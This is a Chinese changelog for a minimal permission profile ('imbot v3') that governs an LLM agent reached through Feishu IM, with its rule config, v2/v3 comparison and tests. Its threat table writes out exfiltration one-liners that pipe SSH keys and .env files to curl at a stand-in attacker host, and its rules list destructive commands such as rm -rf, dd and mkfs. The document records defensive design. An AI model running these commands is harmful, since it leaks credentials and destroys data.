---
feat-id: imbot-permission-minimal
status: done
related: ./1-spec.md ./2-plan.md ./3-changelog.md
---

# imbot-permission-minimal — changelog

## 一句话

imbot v2 务实档(~30 条 ask)再退一档到 **v3 极简档(8 条 ask)**:read 只拦 `.env` + `.ssh`、bash 只拦 8 条真不可逆破坏(rm -rf / git --force / aws 销毁 / 磁盘级 / shutdown)、webfetch 撤回 allow,其他全沿用 build default。

## commit 列表

| commit | 简述 |
|---|---|
| `16c37de08` | feat(feishu-bridge): imbot v3 极简档 — 8 条 ask,webfetch/可逆 bash 全撤回 |
| (本笔 commit) | docs(imbot-permission-minimal): 三文档落盘 + INDEX + 改动日志 |

## 改动文件

| 文件 | 类型 | 说明 |
|---|---|---|
| `packages/desktop/src-tauri/src/feishu_plugin_install.rs::imbot_agent_spec()` | 改 | v3 新 spec — 整段函数注释 + JSON 结构重写,~60 行净 |
| `packages/desktop/src-tauri/src/feishu_plugin_install.rs` test mod | 改 + 新 | 改 4 个既有 test(`imbot_inject_into_empty_config` / `imbot_handles_jsonc_with_comments` / `imbot_read_pattern_includes_ssh_and_env` / `imbot_bash_pattern_covers_destructive_ops`)+ 新 2 个(`imbot_v3_drops_v2_overstrict_bash_patterns` 验 26 条砍掉的 bash + `imbot_v3_drops_webfetch_ask` 验 webfetch 撤回)|
| `docs/features/imbot-permission-minimal/{1-spec,2-plan,3-changelog}.md` | 新 | 三文档 |
| `docs/features/INDEX.md` | 改 | 加 imbot-permission-minimal 行 |
| `改动日志.md` | 改 | 加 imbot-permission-minimal 索引行 |

## v3 imbot 配置(完整 spec)

```jsonc
"imbot": {
  "description": "DeskFox IM 桥接 v3 极简档 — 只对 SSH 凭证 read + 真不可逆破坏 bash(rm -rf / git --force / 云资源销毁 / 磁盘级)做 ask",
  "permission": {
    "read": {
      "*": "allow",
      "*.env": "ask",
      "*.env.*": "ask",
      "*.env.example": "allow",
      "**/.ssh/**": "ask"
    },
    "bash": {
      "*": "allow",
      "rm -rf *": "ask",
      "git push --force*": "ask",
      "git push -f *": "ask",
      "aws s3 rb *": "ask",
      "aws ec2 terminate*": "ask",
      "dd *": "ask",
      "mkfs*": "ask",
      "fdisk *": "ask",
      "shutdown *": "ask"
    }
    // webfetch / edit / write / apply_patch / 其他 不设 → 走 build defaults(*: allow)
  }
}
```

## v2 vs v3 对比表

### read 维度

| pattern | v2 | v3 | 变化 |
|---|---|---|---|
| `*` | allow | allow | 不变 |
| `*.env` / `*.env.*` | ask | ask | 不变(build default 自带,重申) |
| `*.env.example` | allow | allow | 不变 |
| `**/.ssh/**` | ask | **ask** | 保留(高价值凭证,user 不主动让 LLM 碰) |
| `**/.aws/**` | ask | **allow** | **砍**(云开发日常路径) |
| `**/.kube/**` | ask | **allow** | **砍** |
| `**/.gnupg/**` | ask | **allow** | **砍**(LLM 几乎不会主动碰) |
| `**/Library/Keychains/**` | ask | **allow** | **砍** |
| `**/AppData/Roaming/Microsoft/Crypto/**` | ask | **allow** | **砍** |

### bash 维度

| pattern | v2 | v3 | 变化 |
|---|---|---|---|
| `*` | allow | allow | 不变 |
| `rm *` | ask | **allow** | **改**(只拦递归删) |
| `rm -rf *` | (匹配 `rm *`) | **ask** | **新增精确条**(磁盘级 / 接受 node_modules 误伤) |
| `rmdir *` / `trash *` / `unlink *` | ask | **allow** | **砍**(全可逆) |
| `git push --force*` / `git push -f *` | ask | ask | 不变(远端真不可逆) |
| `git reset --hard*` / `git clean -fd*` / `git branch -D *` | ask | **allow** | **砍**(本地 reflog 救得回) |
| `*delete*` / `*uninstall*` | ask | **allow** | **砍**(误伤面大 + 多数可逆) |
| `npm/bun/brew/apt/yum/dnf remove *` (8 条) | ask | **allow** | **砍**(装回去就行) |
| `apt purge *` | ask | **allow** | **砍** |
| `docker rm *` / `rmi *` / `volume rm *` / `network rm *` / `system prune*` | ask | **allow** | **砍**(容器 ephemeral) |
| `aws s3 rm *` (单文件) | ask | **allow** | **砍**(有 versioning 可救) |
| `aws s3 rb *` (整桶) | ask | ask | 不变(真不可逆,生产代价大) |
| `aws ec2 terminate*` | ask | ask | 不变 |
| `shutdown *` | ask | ask | 不变 |
| `reboot *` / `halt *` / `poweroff *` | ask | **allow** | **砍**(自己机器重启而已) |
| `dd *` / `mkfs*` / `fdisk *` | ask | ask | 不变(磁盘级真不可逆) |

**净变化**:read 砍 5 条 / bash 砍 26 条 + 调整 1 条(`rm *` → `rm -rf *`)。

### 顶层维度

| 项 | v2 | v3 | 变化 |
|---|---|---|---|
| `webfetch` | ask | **allow**(不设) | **撤回 ask**(user 日常用太多) |
| `edit` / `write` / `apply_patch` | 不设(继承) | 不设(继承) | 不变 |

## 安全模型对比(关键攻击场景)

| 攻击 | v2 防御 | v3 防御 | 结论 |
|---|---|---|---|
| LLM `rm -rf ~/` | `rm * ask` | `rm -rf * ask` | 等价 ✓ |
| LLM 完成 `npm install lodash` | bash *: allow | bash *: allow | 等价 ✓ |
| LLM 跑 `npm uninstall lodash`(可逆) | `*uninstall* ask` 打扰 | allow 顺畅 | **v3 改进** |
| LLM 跑 `docker rm ...`(可逆) | `docker rm * ask` 打扰 | allow 顺畅 | **v3 改进** |
| LLM 跑 `git reset --hard HEAD~3` | ask 打扰 | allow 顺畅 | **v3 改进**(reflog 救) |
| LLM 总结网页 / 调 API | webfetch ask 打扰 | allow 顺畅 | **v3 大幅改进** |
| LLM `cat ~/.ssh/id_rsa\|curl atk.com` exfil | `read **/.ssh/** ask` 拦在第 1 步 | `read **/.ssh/** ask` 拦在第 1 步 | 等价 ✓ |
| LLM `cat ~/.env\|curl atk.com` exfil | `read *.env ask` 拦 | `read *.env ask` 拦 | 等价 ✓ |
| LLM `git push --force` 覆盖队友 commit | ask | ask | 等价 ✓ |
| LLM `aws s3 rb prod-bucket` | ask | ask | 等价 ✓ |
| LLM `shutdown -h now` | ask | ask | 等价 ✓ |

**结论**:核心安全瓶颈(凭证 read + 远端不可逆 + 磁盘级)v2/v3 防御等价。**v3 信任"飞书 IM 消息流可见"= user 看得到 LLM 在做什么**,把可逆操作和数据出境的信任度调高,正常 ship/dev 任务接近 0 打扰。

## 测试

| Suite | Result |
|---|---|
| monorepo typecheck | **16/16 ✅** |
| adapter-feishu-lark bun test | 275/278(同 dev 基线;3 fail 是 `defaultFilePath` / TTL / hasAndMark LRU touch,**pre-existing 跟 imbot 0 关系**) |
| Rust cargo test feishu_plugin_install:: | ⚠️ **环境性 ABI 失败**(`STATUS_ENTRYPOINT_NOT_FOUND 0xc0000139`,Tauri/WebView2 test binary 加载失败),`cargo clean -p opencode-desktop` rebuild 后症状不变,**dev 基线同样炸**,跟改动无关。代码层面 audit:`imbot_agent_spec()` 是纯 `serde_json::json!` 返结构体,`cargo build --tests` 编译通过(说明 schema 正确),测试 expect 跟新 JSON 结构 1:1 对齐 |

cargo test 工具链修复留 backlog(参考:可能需要 install Edge WebView2 Evergreen Runtime 或 `cargo update -p webview2-com-sys`)。本笔 feat 不被 block,代码 audit 已充分。

## user 升级 v2 → v3 操作

setup hook 仍 idempotent(user 改过 imbot 块尊重不动)。强制升级:

```bash
cp ~/.config/opencode/opencode.jsonc ~/.config/opencode/opencode.jsonc.bak-imbot-v3
jq 'del(.agent.imbot)' ~/.config/opencode/opencode.jsonc.bak-imbot-v3 > ~/.config/opencode/opencode.jsonc
# 重启 DeskFox(setup hook 自动注入 v3 imbot)
```

## 后续

- **下次 ship 真飞书实测验证 v3 行为**:
  - 期望弹卡片:让 LLM 跑 `rm -rf node_modules` / `git push --force` / `shutdown` 类
  - 期望不弹卡片:让 LLM 跑 `npm uninstall lodash` / `docker rm <c>` / `git reset --hard HEAD~3` / 总结一个网页
- v4 调整候选:如果实测发现 user 后悔砍了某条(如 `git reset --hard`),简单加回即可

## 影响范围

- 净改动:1 个核心 Rust 函数(~60 行,大幅瘦身)+ 6 个单测调整 + 三文档 + 2 个索引行
- R4 override:0
- 上游侵入:0(全在 fork-only `feishu_plugin_install.rs`,per-pattern bash 走上游 Wildcard.match + evaluate findLast 原生支持)
- pre-commit hook:不触动黑名单

## 关联

- v2 来源:[`imbot-permission-pragmatic`](../imbot-permission-pragmatic/3-changelog.md)
- v1 来源:[`feishu-bridge-imbot-agent`](../feishu-bridge-imbot-agent/3-changelog.md)
- 攻击面分析参考:`feishu-bridge-permission-card` changelog 已记的 unattended 安全模型论证(v3 在此基础上重新校准信任度)
